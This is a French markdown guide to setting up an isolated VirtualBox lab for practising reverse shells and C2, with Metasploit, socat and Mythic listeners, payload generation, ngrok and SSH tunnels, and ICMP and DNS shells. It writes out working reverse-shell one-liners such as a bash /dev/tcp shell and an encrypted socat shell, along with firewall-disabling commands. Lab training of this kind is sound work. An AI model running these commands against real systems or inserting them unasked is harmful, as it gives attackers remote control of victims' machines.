# Setup Réseau Lab pour C2/Reverse Shell

## Vue d'ensemble

Configuration réseau isolé pour tester reverse shells, bind shells, et C2.

## Topologie lab

```
[Attacker VM]          [Target Windows]        [Target Linux]
192.168.56.10          192.168.56.20           192.168.56.30
  (Kali)                 (Win10)                 (Ubuntu)
     |                      |                        |
     +----------------------+------------------------+
                            |
                    [Host-Only Network]
                    vboxnet0: 192.168.56.1
```

## VirtualBox Host-Only Network

### Créer réseau
```bash
# Créer host-only network
VBoxManage hostonlyif create

# Configurer IP
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Activer DHCP (optionnel)
VBoxManage dhcpserver add --ifname vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0 --lowerip 192.168.56.100 --upperip 192.168.56.200
VBoxManage dhcpserver modify --ifname vboxnet0 --enable
```

### Attacher VMs
```bash
# Attacker VM
VBoxManage modifyvm "Kali-Lab" --nic1 hostonly --hostonlyadapter1 vboxnet0

# Target VMs
VBoxManage modifyvm "Windows10-Lab" --nic1 hostonly --hostonlyadapter1 vboxnet0
VBoxManage modifyvm "Linux-Lab" --nic1 hostonly --hostonlyadapter1 vboxnet0
```

## Configuration IPs statiques

### Linux (Attacker/Target)
```bash
# /etc/network/interfaces
sudo nano /etc/network/interfaces

# Ajouter:
auto eth0
iface eth0 inet static
    address 192.168.56.10
    netmask 255.255.255.0
    gateway 192.168.56.1

# Appliquer
sudo systemctl restart networking

# Ou via netplan (Ubuntu 18.04+)
sudo nano /etc/netplan/01-netcfg.yaml

network:
  version: 2
  ethernets:
    eth0:
      addresses: [192.168.56.10/24]
      gateway4: 192.168.56.1
      nameservers:
        addresses: [8.8.8.8]

sudo netplan apply
```

### Windows (Target)
```powershell
# PowerShell Admin
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.56.20 -PrefixLength 24 -DefaultGateway 192.168.56.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 8.8.8.8
```

### macOS (Target)
```bash
# GUI: System Preferences → Network → Configure IPv4: Manually

# CLI
sudo networksetup -setmanual "Ethernet" 192.168.56.30 255.255.255.0 192.168.56.1
```

## Test connectivité

```bash
# Depuis Attacker (192.168.56.10)
ping 192.168.56.20  # Windows
ping 192.168.56.30  # Linux

# Depuis Targets
ping 192.168.56.10  # Attacker

# Port scan
nmap -sV 192.168.56.0/24
```

## Setup Listeners

### Netcat (simple)
```bash
# Attacker - Reverse shell listener
nc -lvnp 4444

# Attacker - Bind shell connection
nc 192.168.56.20 4444
```

### Metasploit (handler)
```bash
msfconsole

# Reverse shell handler
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
exploit -j

# Autre payload
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 5555
exploit -j

# Lister sessions
sessions -l

# Interagir avec session
sessions -i 1
```

### Socat (avancé)
```bash
# Listener avec log
socat -d -d TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Reverse shell encrypted (SSL)
# Générer certificat
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener SSL
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash

# Client SSL (depuis target)
socat OPENSSL:192.168.56.10:4444,verify=0 EXEC:/bin/bash
```

## Firewall configuration

### Linux (iptables)
```bash
# Autoriser connexions entrantes sur port 4444
sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT

# NAT pour accès Internet (optionnel)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo sysctl -w net.ipv4.ip_forward=1

# Sauvegarder rules
sudo iptables-save > /etc/iptables/rules.v4
```

### Windows (désactiver ou configurer)
```powershell
# Désactiver (pour lab)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Ou autoriser port spécifique
New-NetFirewallRule -DisplayName "Allow Reverse Shell" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow
```

## Capture trafic (Wireshark)

### Sur attacker
```bash
# Installer wireshark
sudo apt install wireshark

# Ajouter user au groupe
sudo usermod -aG wireshark $USER
newgrp wireshark

# Capturer interface
wireshark -i eth0 -k

# Filtrer traffic reverse shell
tcp.port == 4444
```

### Analyse offline
```bash
# Capturer vers fichier
tcpdump -i eth0 -w capture.pcap port 4444

# Analyser
wireshark capture.pcap

# Extraire shell commands (si non-encrypted)
tcpdump -A -r capture.pcap
```

## Setup C2 Framework (Mythic)

### Installation
```bash
# Sur Attacker VM
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./install_docker_ubuntu.sh
sudo make

# Lancer
sudo ./mythic-cli start

# Accès Web UI
# http://192.168.56.10:7443
# Credentials affichés au premier lancement
```

### Créer payload
```
Web UI → Payloads → Generate New Payload
Agent: apollo (Windows), poseidon (Linux)
Commands: shell, upload, download
C2 Profile: http
Callback Host: 192.168.56.10
Callback Port: 8080

Build → Download payload
```

## Port forwarding (pour reverse shell depuis Internet)

### SSH tunnel
```bash
# Depuis target (derrière NAT) vers attacker public
ssh -R 4444:localhost:4444 user@attacker.com

# Attacker écoute sur localhost:4444
# Traffic redirigé vers target
```

### Ngrok (pour tests rapides)
```bash
# Sur attacker
ngrok tcp 4444

# URL public générée: tcp://0.tcp.ngrok.io:12345
# Configurer reverse shell pour se connecter à cette URL
```

## Testing reverse shells

### Script test automatique
```bash
#!/bin/bash
# test_reverse_shell.sh

ATTACKER_IP="192.168.56.10"
ATTACKER_PORT=4444

echo "[*] Lancement listener sur $ATTACKER_IP:$ATTACKER_PORT..."
nc -lvnp $ATTACKER_PORT &
LISTENER_PID=$!

sleep 2

echo "[*] Connexion reverse shell depuis localhost..."
bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" &

sleep 2

echo "[*] Envoi commande..."
echo "whoami" | nc localhost $ATTACKER_PORT

kill $LISTENER_PID
echo "[+] Test terminé"
```

## Isolation réseau (sécurité)

### Empêcher accès Internet
```bash
# Sur VMs, bloquer tout sauf réseau local
sudo iptables -A OUTPUT -d 192.168.56.0/24 -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
sudo iptables -A OUTPUT -j DROP
```

### Monitoring connexions suspectes
```bash
# Logger connexions sortantes
sudo iptables -A OUTPUT -p tcp --dport 4444 -j LOG --log-prefix "REVERSE_SHELL: "

# Voir logs
sudo tail -f /var/log/syslog | grep REVERSE_SHELL
```

## Protocoles alternatifs

### ICMP (ping) shell
```bash
# Attacker
sudo icmpsh_m.py 192.168.56.10 192.168.56.20

# Target (Windows)
icmpsh.exe -t 192.168.56.10
```

### DNS tunneling
```bash
# Attacker (serveur DNS)
iodined -f -c -P password 192.168.56.10 tunnel.lab

# Target
iodine -f -P password 192.168.56.10 tunnel.lab
```

### HTTP/HTTPS C2
```bash
# Cobalt Strike, Mythic, Empire, Metasploit...
# Utiliser HTTP profile pour bypass firewalls
```

## Cheatsheet commandes réseau

```bash
# Scan réseau
nmap -sn 192.168.56.0/24

# Listener multi-port
for port in {4444..4450}; do nc -lvnp $port & done

# Kill tous listeners
pkill nc

# Vérifier port ouvert
netstat -tuln | grep 4444
ss -tuln | grep 4444

# Test connexion
telnet 192.168.56.10 4444
curl http://192.168.56.10:8080

# Proxy SOCKS via SSH
ssh -D 9050 user@192.168.56.10
# Utiliser avec proxychains
```

## Ressources

- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Mythic C2](https://github.com/its-a-feature/Mythic)
- [Socat Examples](https://github.com/craSH/socat/blob/master/EXAMPLES)
